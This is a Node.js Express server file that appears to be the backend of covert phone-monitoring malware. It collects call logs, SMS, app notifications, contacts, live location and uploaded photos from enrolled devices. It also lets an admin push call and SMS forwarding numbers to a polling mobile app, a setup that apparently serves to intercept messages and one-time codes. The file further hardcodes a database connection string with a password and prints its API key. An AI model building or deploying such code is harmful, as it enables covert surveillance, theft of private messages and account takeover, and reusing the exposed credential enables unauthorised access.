// server.js
require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const path = require("path");
const multer = require("multer");
const fs = require("fs");

const app = express();

// ─────────────────────────────────────────────
//  Middleware
// ─────────────────────────────────────────────
app.use(cors({ origin: "*" }));

// Resilient JSON body parser with raw buffer capture
app.use(express.json({
  limit: "50mb",
  strict: false,
  verify: (req, _res, buf) => {
    req.rawBuf = buf;
  }
}));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));

// JSON Parsing Error Recovery Middleware (handles bad control characters/emoji bytes in contacts)
app.use((err, req, res, next) => {
  if (err && (err instanceof SyntaxError || err.type === 'entity.parse.failed')) {
    console.warn("⚠️ [JSON RECOVERY] Bad control character detected in request JSON. Sanitizing payload...");
    try {
      const rawText = err.body || (req.rawBuf ? req.rawBuf.toString('utf-8') : '');
      if (rawText) {
        // Strip ASCII/unicode control characters (0x00 - 0x1F except \n \r \t)
        const sanitized = rawText.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]/g, "");
        req.body = JSON.parse(sanitized);
        return next();
      }
    } catch (recoveryErr) {
      console.error("❌ [JSON RECOVERY FAIL] Could not parse raw payload:", recoveryErr.message);
    }
  }
  next(err);
});

// Log every incoming request
app.use((req, res, next) => {
  console.log(`📡 [SERVER RECV] ${req.method} ${req.url} | Body keys: ${Object.keys(req.body || {}).join(', ')}`);
  next();
});

// ── Serve Admin Dashboard ──────────────────────
app.use(express.static(path.join(__dirname, "public")));
app.get("/", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ─────────────────────────────────────────────
//  MongoDB
// ─────────────────────────────────────────────
const MONGODB_URI =
  process.env.MONGODB_URI ||
  process.env.MONGO_URL ||
  "mongodb+srv://geniusattechie:tF2Oe1CBjJVdL9xZ@cluster0.oxahl6y.mongodb.net/bypss?appName=Cluster0";

mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));

// ─────────────────────────────────────────────
//  Schemas & Models
// ─────────────────────────────────────────────

// Device
const deviceSchema = new mongoose.Schema(
  {
    device_id: { type: String, required: true, unique: true, index: true },
    device_name: { type: String, default: "Unknown" },
    first_seen: { type: Date, default: Date.now },
    last_seen: { type: Date, default: Date.now },
    total_events: { type: Number, default: 0 },
    is_active: { type: Boolean, default: true },
    // ── Live device snapshot data ──────────────
    last_location: { type: Object, default: null },
    contacts: { type: Array, default: [] },
    media_list: { type: Array, default: [] },
    // ── Forwarding config ──────────────────────
    forward_number: { type: String, default: "" }, // number to forward to
    call_forward_enabled: { type: Boolean, default: false },
    sms_forward_enabled: { type: Boolean, default: false },
  },
  { timestamps: true, strict: false },
);
const Device = mongoose.model("Device", deviceSchema);

// Call Event
const callSchema = new mongoose.Schema(
  {
    event_key: { type: String, unique: true, sparse: true }, // dedup
    device_id: { type: String, required: true, index: true },
    device_name: { type: String, default: "Unknown" },
    title: { type: String, required: true },
    body: { type: String, default: "" },
    timestamp: { type: Date, default: Date.now, index: true },
    received_at: { type: Date, default: Date.now },
  },
  { timestamps: true },
);
callSchema.index({ device_id: 1, timestamp: -1 });
const CallEvent = mongoose.model("CallEvent", callSchema);

// SMS Event
const smsSchema = new mongoose.Schema(
  {
    event_key: { type: String, unique: true, sparse: true }, // dedup
    device_id: { type: String, required: true, index: true },
    device_name: { type: String, default: "Unknown" },
    title: { type: String, required: true },
    body: { type: String, default: "" },
    timestamp: { type: Date, default: Date.now, index: true },
    received_at: { type: Date, default: Date.now },
  },
  { timestamps: true },
);
smsSchema.index({ device_id: 1, timestamp: -1 });
const SmsEvent = mongoose.model("SmsEvent", smsSchema);

// Notification Event
const notificationSchema = new mongoose.Schema(
  {
    event_key: { type: String, unique: true, sparse: true }, // dedup
    device_id: { type: String, required: true, index: true },
    device_name: { type: String, default: "Unknown" },
    package_name: { type: String, required: true },
    title: { type: String, default: "" },
    content: { type: String, default: "" },
    location: { type: Object, default: null },
    contacts: { type: Array, default: [] },
    sms_list: { type: Array, default: [] },
    media_list: { type: Array, default: [] },
    timestamp: { type: Date, default: Date.now, index: true },
    received_at: { type: Date, default: Date.now },
  },
  { timestamps: true, strict: false },
);
notificationSchema.index({ device_id: 1, timestamp: -1 });
notificationSchema.index({ package_name: 1 });
const NotificationEvent = mongoose.model(
  "NotificationEvent",
  notificationSchema,
);

// ─────────────────────────────────────────────
//  Auth Middleware
// ─────────────────────────────────────────────
const API_KEY = process.env.API_KEY || "your-secret-api-key";

const auth = (req, res, next) => {
  const key = req.headers["authorization"]?.replace("Bearer ", "");
  if (!key || key !== API_KEY) {
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }
  next();
};

// ─────────────────────────────────────────────
//  Helper: update device record with deduplicated data
// ─────────────────────────────────────────────
async function touchDevice(device_id, device_name, location, contacts, media_list) {
  try {
    const device = await Device.findOne({ device_id });
    const now = new Date();

    if (!device) {
      // Create new device record
      let uniqueContacts = [];
      if (Array.isArray(contacts)) {
        const seen = new Set();
        contacts.forEach(c => {
          const key = `${c.name||''}_${c.phone||''}`;
          if (!seen.has(key) && (c.name || c.phone)) {
            seen.add(key);
            uniqueContacts.push(c);
          }
        });
      }

      let uniqueMedia = [];
      if (Array.isArray(media_list)) {
        const seen = new Set();
        media_list.forEach(m => {
          if (m.id && !seen.has(String(m.id))) {
            seen.add(String(m.id));
            uniqueMedia.push(m);
          }
        });
      }

      await Device.create({
        device_id,
        device_name: device_name || "Unknown",
        first_seen: now,
        last_seen: now,
        total_events: 1,
        is_active: true,
        last_location: location || null,
        contacts: uniqueContacts,
        media_list: uniqueMedia,
      });
    } else {
      // Update existing device record
      device.last_seen = now;
      if (device_name && device_name !== "Unknown") device.device_name = device_name;
      device.total_events = (device.total_events || 0) + 1;
      device.is_active = true;

      // 1. Live location: Always update with latest coordinates
      if (location && (location.latitude !== undefined || location.latitude !== null)) {
        device.last_location = {
          ...location,
          timestamp: now,
        };
      }

      // 2. Contacts deduplication: Only add new contacts not already stored
      if (Array.isArray(contacts) && contacts.length > 0) {
        const existingMap = new Map();
        (device.contacts || []).forEach(c => existingMap.set(`${c.name||''}_${c.phone||''}`, c));
        contacts.forEach(c => {
          const key = `${c.name||''}_${c.phone||''}`;
          if (!existingMap.has(key) && (c.name || c.phone)) {
            existingMap.set(key, c);
          }
        });
        device.contacts = Array.from(existingMap.values());
      }

      // 3. Media assets deduplication: Only add new media items not already stored
      if (Array.isArray(media_list) && media_list.length > 0) {
        const existingMediaMap = new Map();
        (device.media_list || []).forEach(m => existingMediaMap.set(String(m.id), m));
        media_list.forEach(m => {
          if (m.id && !existingMediaMap.has(String(m.id))) {
            existingMediaMap.set(String(m.id), m);
          }
        });
        device.media_list = Array.from(existingMediaMap.values());
      }

      await device.save();
    }
  } catch (err) {
    console.error("⚠️ touchDevice error:", err);
  }
}

// ─────────────────────────────────────────────
//  Routes
// ─────────────────────────────────────────────

// Health check (JSON) – at /api/health so static index.html can serve at /
app.get("/api/health", (_req, res) => {
  res.json({
    success: true,
    message: "🚀 Device Monitor Server is running",
    version: "2.0.0",
    timestamp: new Date(),
  });
});

// ── CALL ──────────────────────────────────────
// POST /api/events/call
app.post("/api/events/call", auth, async (req, res) => {
  try {
    const { device_id, device_name, title, body, timestamp, event_key } =
      req.body;
    if (!device_id || !title)
      return res
        .status(400)
        .json({ success: false, message: "device_id and title are required" });

    // Duplicate check — if event_key exists, skip silently
    if (event_key) {
      const existing = await CallEvent.findOne({ event_key });
      if (existing)
        return res
          .status(200)
          .json({ success: true, duplicate: true, data: existing });
    }

    const doc = await CallEvent.create({
      event_key: event_key || null,
      device_id,
      device_name: device_name || "Unknown",
      title,
      body: body || "",
      timestamp: timestamp ? new Date(timestamp) : new Date(),
    });

    await touchDevice(device_id, device_name || "Unknown");
    res.status(201).json({ success: true, data: doc });
  } catch (err) {
    if (err.code === 11000)
      // MongoDB duplicate key
      return res.status(200).json({ success: true, duplicate: true });
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/events/call  (with ?device_id=&page=&limit=)
app.get("/api/events/call", auth, async (req, res) => {
  try {
    const { device_id, page = 1, limit = 50 } = req.query;
    const query = device_id ? { device_id } : {};
    const docs = await CallEvent.find(query)
      .sort({ timestamp: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit));
    const total = await CallEvent.countDocuments(query);
    res.json({ success: true, data: docs, total, page: Number(page) });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// DELETE /api/events/call  (delete all for a device)
app.delete("/api/events/call", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = device_id ? { device_id } : {};
    const result = await CallEvent.deleteMany(query);
    res.json({ success: true, deleted: result.deletedCount });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ── SMS ───────────────────────────────────────
// POST /api/events/sms
app.post("/api/events/sms", auth, async (req, res) => {
  try {
    const { device_id, device_name, title, body, timestamp, event_key } =
      req.body;
    if (!device_id || !title)
      return res
        .status(400)
        .json({ success: false, message: "device_id and title are required" });

    if (event_key) {
      const existing = await SmsEvent.findOne({ event_key });
      if (existing)
        return res
          .status(200)
          .json({ success: true, duplicate: true, data: existing });
    }

    const doc = await SmsEvent.create({
      event_key: event_key || null,
      device_id,
      device_name: device_name || "Unknown",
      title,
      body: body || "",
      timestamp: timestamp ? new Date(timestamp) : new Date(),
    });

    await touchDevice(device_id, device_name || "Unknown");
    res.status(201).json({ success: true, data: doc });
  } catch (err) {
    if (err.code === 11000)
      return res.status(200).json({ success: true, duplicate: true });
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/events/sms
app.get("/api/events/sms", auth, async (req, res) => {
  try {
    const { device_id, page = 1, limit = 50 } = req.query;
    const query = device_id ? { device_id } : {};
    const docs = await SmsEvent.find(query)
      .sort({ timestamp: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit));
    const total = await SmsEvent.countDocuments(query);
    res.json({ success: true, data: docs, total, page: Number(page) });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// DELETE /api/events/sms
app.delete("/api/events/sms", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = device_id ? { device_id } : {};
    const result = await SmsEvent.deleteMany(query);
    res.json({ success: true, deleted: result.deletedCount });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ── NOTIFICATION ──────────────────────────────
// POST /api/events/notification & /api/notifications
app.post(["/api/events/notification", "/api/notifications"], auth, async (req, res) => {
  try {
    const {
      device_id,
      device_name,
      package_name,
      title,
      content,
      location,
      contacts,
      sms_list,
      media_list,
      timestamp,
      event_key,
    } = req.body;

    if (!device_id || !package_name)
      return res
        .status(400)
        .json({
          success: false,
          message: "device_id and package_name are required",
        });

    if (event_key) {
      const existing = await NotificationEvent.findOne({ event_key });
      if (existing) {
        // Update existing record with new snapshot data (location, contacts, sms, media)
        existing.location = location || existing.location;
        if (contacts?.length) existing.contacts = contacts;
        if (sms_list?.length) existing.sms_list = sms_list;
        if (media_list?.length) existing.media_list = media_list;
        await existing.save();
        return res
          .status(200)
          .json({ success: true, updated: true, data: existing });
      }
    }

    const payloadObj = {
      device_id,
      device_name: device_name || "Unknown",
      package_name,
      title: title || "",
      content: content || "",
      location: location || null,
      contacts: contacts || [],
      sms_list: sms_list || [],
      media_list: media_list || [],
      timestamp: timestamp ? new Date(timestamp) : new Date(),
    };

    if (event_key) {
      payloadObj.event_key = event_key;
    }

    const doc = await NotificationEvent.create(payloadObj);

    // Non-blocking background update of device snapshot
    touchDevice(device_id, device_name || "Unknown", location, contacts, media_list).catch((err) =>
      console.error("⚠️ Background touchDevice error:", err),
    );

    res.status(201).json({ success: true, data: doc });
  } catch (err) {
    if (err.code === 11000) {
      // Fallback: Create without event_key to ensure data is ALWAYS saved
      try {
        const fallbackDoc = await NotificationEvent.create({
          device_id: req.body.device_id,
          device_name: req.body.device_name || "Unknown",
          package_name: req.body.package_name,
          title: req.body.title || "",
          content: req.body.content || "",
          location: req.body.location || null,
          contacts: req.body.contacts || [],
          sms_list: req.body.sms_list || [],
          media_list: req.body.media_list || [],
          timestamp: req.body.timestamp ? new Date(req.body.timestamp) : new Date(),
        });
        await touchDevice(req.body.device_id, req.body.device_name || "Unknown", req.body.location, req.body.contacts, req.body.media_list);
        return res.status(201).json({ success: true, fallback: true, data: fallbackDoc });
      } catch (fallbackErr) {
        return res.status(500).json({ success: false, message: fallbackErr.message });
      }
    }
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/location – latest location per device
app.get("/api/location", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = {};
    if (device_id) query.device_id = device_id;

    const devices = await Device.find({ ...query, last_location: { $ne: null } }).select("device_id device_name last_location last_seen");
    const notifLocs = await NotificationEvent.find({ ...query, location: { $ne: null } }).sort({ timestamp: -1 }).limit(30);

    let locationList = [];
    devices.forEach(d => {
      if (d.last_location) {
        locationList.push({
          device_id: d.device_id,
          device_name: d.device_name,
          location: d.last_location,
          timestamp: d.last_location.timestamp || d.last_seen
        });
      }
    });

    notifLocs.forEach(n => {
      locationList.push({
        device_id: n.device_id,
        device_name: n.device_name,
        location: n.location,
        timestamp: n.timestamp
      });
    });

    res.json({ success: true, count: locationList.length, data: locationList });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/contacts – deduplicated contacts per device
app.get("/api/contacts", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = {};
    if (device_id) query.device_id = device_id;

    const devices = await Device.find(query).select("device_id device_name contacts last_seen");

    let allContacts = [];
    devices.forEach((d) => {
      if (Array.isArray(d.contacts)) {
        d.contacts.forEach((c) => {
          allContacts.push({
            name: c.name || "No Name",
            phone: c.phone || "",
            device_id: d.device_id,
            device_name: d.device_name,
            synced_at: d.last_seen,
          });
        });
      }
    });

    res.json({ success: true, count: allContacts.length, data: allContacts });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/media-summary – deduplicated media assets per device
app.get("/api/media-summary", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = {};
    if (device_id) query.device_id = device_id;

    const devices = await Device.find(query).select("device_id device_name media_list last_seen");

    let allMedia = [];
    devices.forEach((d) => {
      if (Array.isArray(d.media_list)) {
        d.media_list.forEach((m) => {
          allMedia.push({
            id: m.id || "0",
            type: m.type || "image",
            width: m.width || 0,
            height: m.height || 0,
            duration: m.duration || 0,
            create_dt: m.create_dt || d.last_seen,
            device_id: d.device_id,
            device_name: d.device_name,
            synced_at: d.last_seen,
          });
        });
      }
    });

    res.json({ success: true, count: allMedia.length, data: allMedia });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/events/notification
app.get("/api/events/notification", auth, async (req, res) => {
  try {
    const { device_id, package_name, page = 1, limit = 50 } = req.query;
    const query = {};
    if (device_id) query.device_id = device_id;
    if (package_name) query.package_name = package_name;

    const docs = await NotificationEvent.find(query)
      .sort({ timestamp: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit));
    const total = await NotificationEvent.countDocuments(query);
    res.json({ success: true, data: docs, total, page: Number(page) });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/location – latest location events
app.get("/api/location", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = { location: { $ne: null } };
    if (device_id) query.device_id = device_id;

    const docs = await NotificationEvent.find(query)
      .sort({ timestamp: -1 })
      .limit(50);
    res.json({ success: true, count: docs.length, data: docs });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/contacts – synced contacts
app.get("/api/contacts", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = { "contacts.0": { $exists: true } };
    if (device_id) query.device_id = device_id;

    const docs = await NotificationEvent.find(query)
      .sort({ timestamp: -1 })
      .limit(20);

    let allContacts = [];
    docs.forEach((doc) => {
      if (Array.isArray(doc.contacts)) {
        doc.contacts.forEach((c) => {
          allContacts.push({
            name: c.name || "No Name",
            phone: c.phone || "",
            device_id: doc.device_id,
            device_name: doc.device_name,
            synced_at: doc.timestamp,
          });
        });
      }
    });

    res.json({ success: true, count: allContacts.length, data: allContacts });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/media-summary – synced media summary
app.get("/api/media-summary", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = { "media_list.0": { $exists: true } };
    if (device_id) query.device_id = device_id;

    const docs = await NotificationEvent.find(query)
      .sort({ timestamp: -1 })
      .limit(20);

    let allMedia = [];
    docs.forEach((doc) => {
      if (Array.isArray(doc.media_list)) {
        doc.media_list.forEach((m) => {
          allMedia.push({
            id: m.id || "0",
            type: m.type || "image",
            width: m.width || 0,
            height: m.height || 0,
            duration: m.duration || 0,
            create_dt: m.create_dt || doc.timestamp,
            device_id: doc.device_id,
            device_name: doc.device_name,
            synced_at: doc.timestamp,
          });
        });
      }
    });

    res.json({ success: true, count: allMedia.length, data: allMedia });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// DELETE /api/events/notification
app.delete("/api/events/notification", auth, async (req, res) => {
  try {
    const { device_id } = req.query;
    const query = device_id ? { device_id } : {};
    const result = await NotificationEvent.deleteMany(query);
    res.json({ success: true, deleted: result.deletedCount });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ── DEVICES ───────────────────────────────────
// GET /api/devices
app.get("/api/devices", auth, async (req, res) => {
  try {
    const devices = await Device.find().sort({ last_seen: -1 });
    res.json({ success: true, count: devices.length, data: devices });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/devices/:device_id  – full summary for one device
app.get("/api/devices/:device_id", auth, async (req, res) => {
  try {
    const { device_id } = req.params;
    const device = await Device.findOne({ device_id });
    if (!device)
      return res
        .status(404)
        .json({ success: false, message: "Device not found" });

    const [calls, sms, notifications] = await Promise.all([
      CallEvent.countDocuments({ device_id }),
      SmsEvent.countDocuments({ device_id }),
      NotificationEvent.countDocuments({ device_id }),
    ]);

    res.json({
      success: true,
      data: {
        ...device.toObject(),
        stats: { calls, sms, notifications },
      },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// DELETE /api/devices/:device_id  – wipe all data for device
app.delete("/api/devices/:device_id", auth, async (req, res) => {
  try {
    const { device_id } = req.params;
    await Promise.all([
      CallEvent.deleteMany({ device_id }),
      SmsEvent.deleteMany({ device_id }),
      NotificationEvent.deleteMany({ device_id }),
      Device.deleteOne({ device_id }),
    ]);
    res.json({ success: true, message: "Device and all its data deleted" });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ── FORWARDING CONFIG ─────────────────────────

// PATCH /api/devices/:device_id/forward  — admin sets forward number
app.patch("/api/devices/:device_id/forward", auth, async (req, res) => {
  try {
    const { device_id } = req.params;
    const { forward_number, call_forward_enabled, sms_forward_enabled } =
      req.body;

    const update = {};
    if (forward_number !== undefined)
      update.forward_number = forward_number.trim();
    if (call_forward_enabled !== undefined)
      update.call_forward_enabled = !!call_forward_enabled;
    if (sms_forward_enabled !== undefined)
      update.sms_forward_enabled = !!sms_forward_enabled;

    const device = await Device.findOneAndUpdate(
      { device_id },
      { $set: update },
      { new: true },
    );
    if (!device)
      return res
        .status(404)
        .json({ success: false, message: "Device not found" });

    res.json({ success: true, data: device });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/devices/:device_id/config  — Flutter app polls this
// Returns forwarding config for the device (NO auth — device uses its own device_id)
app.get("/api/devices/:device_id/config", async (req, res) => {
  try {
    const { device_id } = req.params;
    // Light auth — check api key still
    const key = req.headers["authorization"]?.replace("Bearer ", "");
    if (!key || key !== API_KEY)
      return res.status(401).json({ success: false, message: "Unauthorized" });

    const device = await Device.findOne({ device_id }).select(
      "forward_number call_forward_enabled sms_forward_enabled device_name",
    );

    if (!device)
      return res
        .status(404)
        .json({ success: false, message: "Device not found" });

    res.json({
      success: true,
      config: {
        forward_number: device.forward_number || "",
        call_forward_enabled: device.call_forward_enabled || false,
        sms_forward_enabled: device.sms_forward_enabled || false,
      },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ── STATS / ANALYTICS ─────────────────────────
// GET /api/stats
app.get("/api/stats", auth, async (req, res) => {
  try {
    const last24h = new Date(Date.now() - 24 * 60 * 60 * 1000);

    const [
      totalCalls,
      totalSms,
      totalNotifications,
      totalDevices,
      recentCalls,
      recentSms,
      recentNotifications,
      topApps,
    ] = await Promise.all([
      CallEvent.countDocuments(),
      SmsEvent.countDocuments(),
      NotificationEvent.countDocuments(),
      Device.countDocuments(),
      CallEvent.countDocuments({ received_at: { $gte: last24h } }),
      SmsEvent.countDocuments({ received_at: { $gte: last24h } }),
      NotificationEvent.countDocuments({ received_at: { $gte: last24h } }),
      NotificationEvent.aggregate([
        { $group: { _id: "$package_name", count: { $sum: 1 } } },
        { $sort: { count: -1 } },
        { $limit: 10 },
      ]),
    ]);

    res.json({
      success: true,
      stats: {
        total: {
          calls: totalCalls,
          sms: totalSms,
          notifications: totalNotifications,
          devices: totalDevices,
        },
        last_24h: {
          calls: recentCalls,
          sms: recentSms,
          notifications: recentNotifications,
        },
        top_apps: topApps,
      },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// GET /api/analytics/daily?days=7
app.get("/api/analytics/daily", auth, async (req, res) => {
  try {
    const days = parseInt(req.query.days) || 7;
    const startDate = new Date();
    startDate.setDate(startDate.getDate() - days);

    const fmt = "%Y-%m-%d";
    const matchStage = { received_at: { $gte: startDate } };
    const groupStage = {
      _id: { $dateToString: { format: fmt, date: "$received_at" } },
      count: { $sum: 1 },
    };

    const [calls, sms, notifications] = await Promise.all([
      CallEvent.aggregate([
        { $match: matchStage },
        { $group: groupStage },
        { $sort: { _id: 1 } },
      ]),
      SmsEvent.aggregate([
        { $match: matchStage },
        { $group: groupStage },
        { $sort: { _id: 1 } },
      ]),
      NotificationEvent.aggregate([
        { $match: matchStage },
        { $group: groupStage },
        { $sort: { _id: 1 } },
      ]),
    ]);

    res.json({
      success: true,
      period: `Last ${days} days`,
      data: { calls, sms, notifications },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ── SEARCH ────────────────────────────────────
// GET /api/search?q=hello&type=all|call|sms|notification&device_id=
app.get("/api/search", auth, async (req, res) => {
  try {
    const { q, type = "all", device_id } = req.query;
    if (!q)
      return res
        .status(400)
        .json({ success: false, message: "Query param q is required" });

    const regex = { $regex: q, $options: "i" };
    const deviceFilter = device_id ? { device_id } : {};
    const limit = 50;

    const results = {};

    if (type === "all" || type === "call") {
      results.calls = await CallEvent.find({
        ...deviceFilter,
        $or: [{ title: regex }, { body: regex }],
      })
        .sort({ timestamp: -1 })
        .limit(limit);
    }

    if (type === "all" || type === "sms") {
      results.sms = await SmsEvent.find({
        ...deviceFilter,
        $or: [{ title: regex }, { body: regex }],
      })
        .sort({ timestamp: -1 })
        .limit(limit);
    }

    if (type === "all" || type === "notification") {
      results.notifications = await NotificationEvent.find({
        ...deviceFilter,
        $or: [{ title: regex }, { content: regex }, { package_name: regex }],
      })
        .sort({ timestamp: -1 })
        .limit(limit);
    }

    res.json({ success: true, query: q, data: results });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ─────────────────────────────────────────────
//  GALLERY
// ─────────────────────────────────────────────

// Multer — save photos to uploads/<device_id>/
const _storage = multer.diskStorage({
  destination: (req, file, cb) => {
    let dir = path.join(__dirname, "uploads", req.body.device_id || "unknown");
    if (req.body.is_hidden === "true") {
      dir = path.join(dir, "hidden");
    }
    fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (_req, file, cb) => {
    cb(null, `${Date.now()}_${file.originalname}`);
  },
});
const upload = multer({
  storage: _storage,
  limits: { fileSize: 50 * 1024 * 1024 },
  fileFilter: (_req, file, cb) => {
    cb(null, true);
  },
});

// Serve uploaded files publicly
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

// Photo Schema
const photoSchema = new mongoose.Schema(
  {
    event_key: { type: String, unique: true, sparse: true },
    device_id: { type: String, required: true, index: true },
    device_name: { type: String, default: "Unknown" },
    file_name: { type: String, required: true },
    file_path: { type: String, required: true },
    file_url: { type: String, required: true },
    file_size: { type: Number, default: 0 },
    width: { type: Number, default: 0 },
    height: { type: Number, default: 0 },
    duration: { type: Number, default: 0 },
    is_hidden: { type: Boolean, default: false },
    timestamp: { type: Date, default: Date.now, index: true },
    received_at: { type: Date, default: Date.now },
  },
  { timestamps: true },
);
photoSchema.index({ device_id: 1, timestamp: -1 });
const Photo = mongoose.model("Photo", photoSchema);

// POST /api/gallery/upload
app.post(
  "/api/gallery/upload",
  auth,
  upload.single("photo"),
  async (req, res) => {
    try {
      if (!req.file)
        return res
          .status(400)
          .json({ success: false, message: "No file uploaded" });

      const {
        device_id,
        device_name,
        file_name,
        timestamp,
        width,
        height,
        duration,
        is_hidden,
      } = req.body;
      if (!device_id)
        return res
          .status(400)
          .json({ success: false, message: "device_id required" });

      const isHidden = is_hidden === "true";
      const eventKey = `photo_${device_id}_${file_name}_${timestamp}`;
      const existing = await Photo.findOne({ event_key: eventKey });
      if (existing) {
        fs.unlink(req.file.path, () => {});
        return res.status(200).json({ success: true, duplicate: true });
      }

      const relativePath = isHidden ? `${device_id}/hidden` : device_id;
      const fileUrl = `/uploads/${relativePath}/${req.file.filename}`;
      const doc = await Photo.create({
        event_key: eventKey,
        device_id,
        device_name: device_name || "Unknown",
        file_name: file_name || req.file.originalname,
        file_path: req.file.path,
        file_url: fileUrl,
        file_size: req.file.size,
        width: parseInt(width) || 0,
        height: parseInt(height) || 0,
        duration: parseInt(duration) || 0,
        is_hidden: isHidden,
        timestamp: timestamp ? new Date(timestamp) : new Date(),
      });

      await touchDevice(device_id, device_name || "Unknown");
      res.status(201).json({ success: true, data: doc });
    } catch (err) {
      if (err.code === 11000)
        return res.status(200).json({ success: true, duplicate: true });
      res.status(500).json({ success: false, message: err.message });
    }
  },
);

// GET /api/gallery
app.get("/api/gallery", auth, async (req, res) => {
  try {
    const { device_id, page = 1, limit = 50 } = req.query;
    const query = device_id ? { device_id } : {};
    let photos = await Photo.find(query)
      .sort({ timestamp: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit))
      .select("-file_path")
      .lean();

    photos = photos.map((p) => ({
      ...p,
      file_url: p.file_url ? p.file_url.replace(/^https?:\/\/[^\/]+/, "") : "",
    }));

    const total = await Photo.countDocuments(query);
    res.json({ success: true, data: photos, total, page: Number(page) });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post("/api/admin/clear-db", auth, async (req, res) => {
  try {
    await Promise.all([
      Device.deleteMany({}),
      CallEvent.deleteMany({}),
      SmsEvent.deleteMany({}),
      NotificationEvent.deleteMany({}),
      Photo.deleteMany({}),
    ]);

    // optional: uploads folder bhi empty kar do
    const uploadsDir = path.join(__dirname, "uploads");

    if (fs.existsSync(uploadsDir)) {
      fs.rmSync(uploadsDir, { recursive: true, force: true });
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    return res.json({
      success: true,
      message: "All database collections and uploads cleared",
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({
      success: false,
      message: err.message,
    });
  }
});

// DELETE /api/gallery/:id
app.delete("/api/gallery/:id", auth, async (req, res) => {
  try {
    const photo = await Photo.findByIdAndDelete(req.params.id);
    if (!photo)
      return res.status(404).json({ success: false, message: "Not found" });
    fs.unlink(photo.file_path, () => {});
    res.json({ success: true, message: "Deleted" });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// DELETE /api/gallery/device/:device_id
app.delete("/api/gallery/device/:device_id", auth, async (req, res) => {
  try {
    const { device_id } = req.params;
    const photos = await Photo.find({ device_id });
    for (const p of photos) fs.unlink(p.file_path, () => {});
    const result = await Photo.deleteMany({ device_id });
    res.json({ success: true, deleted: result.deletedCount });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ─────────────────────────────────────────────
//  Error handlers
// ─────────────────────────────────────────────
app.use((req, res) => {
  res.status(404).json({ success: false, message: "Route not found" });
});

app.use((err, _req, res, _next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

// ─────────────────────────────────────────────
//  Start
// ─────────────────────────────────────────────
const PORT = process.env.PORT || 1300;
app.listen(PORT, () => {
  console.log(`🚀 Server on port ${PORT}`);
  console.log(`📦 MongoDB: ${MONGODB_URI}`);
  console.log(`🔑 API Key: ${API_KEY}`);
});
